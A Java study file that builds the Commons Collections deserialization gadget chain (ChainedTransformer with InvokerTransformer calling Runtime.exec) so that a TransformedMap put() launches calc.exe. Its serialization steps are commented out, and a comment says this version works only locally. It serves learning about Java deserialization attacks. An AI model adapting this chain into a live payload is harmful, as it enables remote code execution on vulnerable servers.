package TEST;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

// p神版  直接调用了Runtime，但是Runtime没有继承Serializable，不能反序列化，只能是在本地测试。
// 所以才需要后边的反射
public class LocalPCC {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),

                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
//        Runtime.getRuntime().exec("calc.exe");

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap,transformerChain,null);

        outerMap.put("Local", "Test");

//        FileOutputStream f = new FileOutputStream("payload.bin");
//        ObjectOutputStream fout = new ObjectOutputStream(f);
//        fout.writeObject(outerMap);
//
//        FileInputStream fi = new FileInputStream("payload.bin");
//        ObjectInputStream fin = new ObjectInputStream(fi);
//
//        Map outerMap_now =  (Map)fin.readObject();
//        outerMap_now.put("123", "123");

    }
}